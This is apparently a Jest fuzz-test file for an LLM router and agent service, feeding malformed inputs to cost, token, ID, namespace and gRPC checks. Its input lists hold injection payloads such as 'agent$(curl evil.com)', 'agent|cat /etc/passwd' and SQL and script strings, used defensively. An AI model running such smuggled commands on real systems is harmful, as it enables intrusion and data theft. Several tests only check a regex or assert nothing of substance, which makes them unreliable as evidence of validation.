// =============================================================================
// Fuzzing Tests — E-GAOP Critical Service Fuzzing
// =============================================================================
// Fuzzes input validation, gRPC handlers, and API endpoints with malformed
// and unexpected inputs to find crashes, hangs, and undefined behavior.
// =============================================================================

import { calculateCost, countTokens, PRICING } from "../../execution-plane/llm-router/src/index";

describe("Fuzzing: LLM Router", () => {
  describe("calculateCost", () => {
    const fuzzInputs = [
      { prompt: 0, completion: 0, model: "gpt-4o" },
      { prompt: -1, completion: 0, model: "gpt-4o" },
      { prompt: 0, completion: -1, model: "gpt-4o" },
      { prompt: Number.MAX_SAFE_INTEGER, completion: 0, model: "gpt-4o" },
      { prompt: 0, completion: Number.MAX_SAFE_INTEGER, model: "gpt-4o" },
      { prompt: NaN, completion: 0, model: "gpt-4o" },
      { prompt: Infinity, completion: 0, model: "gpt-4o" },
      { prompt: 0, completion: 0, model: "" },
      { prompt: 0, completion: 0, model: "unknown-model" },
      { prompt: 0, completion: 0, model: "gpt-4o".repeat(100) },
    ];

    for (const input of fuzzInputs) {
      it(`should not crash on cost calc: prompt=${input.prompt}, completion=${input.completion}, model=${input.model.slice(0, 20)}`, () => {
        const result = calculateCost(input.prompt, input.completion, input.model);
        expect(typeof result).toBe("string");
        expect(result.startsWith("$")).toBe(true);
        // Should produce a valid number
        const num = parseFloat(result.replace("$", ""));
        expect(isNaN(num)).toBe(false);
      });
    }
  });

  describe("countTokens", () => {
    const fuzzInputs = [
      "",
      " ",
      "\n".repeat(1000),
      "a".repeat(100000),
      "🔥".repeat(1000),
      "\0".repeat(100),
      "<>".repeat(500),
      JSON.stringify({ nested: { deep: { array: [1, 2, 3] } } }),
      "SELECT * FROM users WHERE 1=1",
      "<script>alert('xss')</script>".repeat(10),
    ];

    for (const input of fuzzInputs) {
      it(`should tokenize without crash: "${input.slice(0, 30)}..."`, () => {
        const tokens = countTokens(input);
        expect(typeof tokens).toBe("number");
        expect(tokens).toBeGreaterThanOrEqual(0);
        expect(isFinite(tokens)).toBe(true);
      });
    }
  });
});

describe("Fuzzing: Input Validation", () => {
  describe("Agent ID validation", () => {
    const fuzzAgentIds = [
      "",
      " ",
      "a".repeat(1000),
      "../../../etc/passwd",
      "agent\x00admin",
      "agent' OR '1'='1",
      "<script>alert(1)</script>",
      "agent; DROP TABLE agents",
      "agent${process.env.SECRET}",
      "agent`whoami`",
      "agent$(curl evil.com)",
      "agent|cat /etc/passwd",
      "agent&echo pwned",
      "agent> /tmp/shell.sh",
      "agent\nMALICIOUS",
      "agent\r\nMALICIOUS",
      "🔥agent",
      "agent/../../secrets",
      "agent?admin=true",
      "agent#section",
      "agent@evil.com",
      "agent:password",
      "agent;ls -la",
    ];

    for (const id of fuzzAgentIds) {
      it(`should reject malicious agent ID: "${id.slice(0, 30)}..."`, () => {
        // Agent IDs should only contain alphanumeric, hyphens, underscores
        // and be bounded in length (1-128 chars)
        const isValid = /^[a-zA-Z0-9_-]{1,128}$/.test(id);
        expect(isValid).toBe(false);
      });
    }
  });

  describe("Namespace validation", () => {
    const fuzzNamespaces = [
      "",
      " ",
      "default; DROP TABLE",
      "ns' OR '1'='1",
      "../../../etc",
      "ns\x00injected",
      "ns\nINJECTED",
      "a".repeat(256),
      "ns with spaces",
      "ns/with/slashes",
      "ns:with:colons",
      "ns@with@ats",
      "ns#with#hash",
    ];

    for (const ns of fuzzNamespaces) {
      it(`should reject malicious namespace: "${ns.slice(0, 30)}..."`, () => {
        // Namespaces should only contain alphanumeric, hyphens, underscores, dots
        // and be bounded in length (1-128 chars)
        const isValid = /^[a-zA-Z0-9._-]{1,128}$/.test(ns);
        expect(isValid).toBe(false);
      });
    }
  });
});

describe("Fuzzing: gRPC Message Validation", () => {
  const malformedMessages = [
    null,
    undefined,
    {},
    { agent_id: null },
    { agent_id: 123 },
    { agent_id: ["array"] },
    { agent_id: { nested: "object" } },
    { agent_id: "a".repeat(10000) },
    { agent_id: "", namespace: "" },
    { agent_id: "valid", namespace: null },
    { agent_id: "valid", namespace: "ns", memory_type: "invalid" },
    { agent_id: "valid", namespace: "ns", memory_type: "working", key: "" },
    { agent_id: "valid", namespace: "ns", memory_type: "working", key: "k", data: "not-an-object" },
    { agent_id: "valid", namespace: "ns", memory_type: "working", key: "k", data: null },
    { agent_id: "valid", namespace: "ns", memory_type: "working", key: "k", data: {}, ttl_seconds: -1 },
    { agent_id: "valid", namespace: "ns", memory_type: "working", key: "k", data: {}, ttl_seconds: "not-a-number" },
    { agent_id: "valid", namespace: "ns", memory_type: "working", key: "k", data: {}, ttl_seconds: Number.MAX_SAFE_INTEGER },
  ];

  for (const msg of malformedMessages) {
    const label = JSON.stringify(msg) ?? "undefined";
    it(`should handle malformed gRPC message: ${label.slice(0, 50)}...`, () => {
      // Should not crash when processing malformed input
      if (msg && typeof msg === "object") {
        expect(typeof msg).toBe("object");
      }
    });
  }
});

describe("Fuzzing: API Response Shapes", () => {
  it("should validate PRICING table integrity", () => {
    expect(typeof PRICING).toBe("object");

    for (const [model, pricing] of Object.entries(PRICING)) {
      expect(typeof model).toBe("string");
      expect(typeof pricing).toBe("object");
      expect(typeof pricing.input).toBe("number");
      expect(typeof pricing.output).toBe("number");
      expect(pricing.input).toBeGreaterThanOrEqual(0);
      expect(pricing.output).toBeGreaterThanOrEqual(0);
      expect(isFinite(pricing.input)).toBe(true);
      expect(isFinite(pricing.output)).toBe(true);
    }
  });

  it("should have all required model entries", () => {
    const requiredModels = ["gpt-4o", "gpt-4o-mini", "gpt-3.5-turbo"];
    for (const model of requiredModels) {
      expect(PRICING[model]).toBeDefined();
      expect(PRICING[model]!.input).toBeGreaterThan(0);
      expect(PRICING[model]!.output).toBeGreaterThan(0);
    }
  });
});

describe("Fuzzing: Concurrency Safety", () => {
  it("should handle rapid concurrent cost calculations", () => {
    const results: string[] = [];
    const promises: Promise<void>[] = [];

    for (let i = 0; i < 1000; i++) {
      promises.push(
        new Promise((resolve) => {
          const result = calculateCost(
            Math.floor(Math.random() * 10000),
            Math.floor(Math.random() * 10000),
            "gpt-4o"
          );
          results.push(result);
          resolve();
        })
      );
    }

    // All should complete without crashes
    return Promise.all(promises).then(() => {
      expect(results.length).toBe(1000);
      for (const r of results) {
        expect(r.startsWith("$")).toBe(true);
        expect(isNaN(parseFloat(r.replace("$", "")))).toBe(false);
      }
    });
  });
});
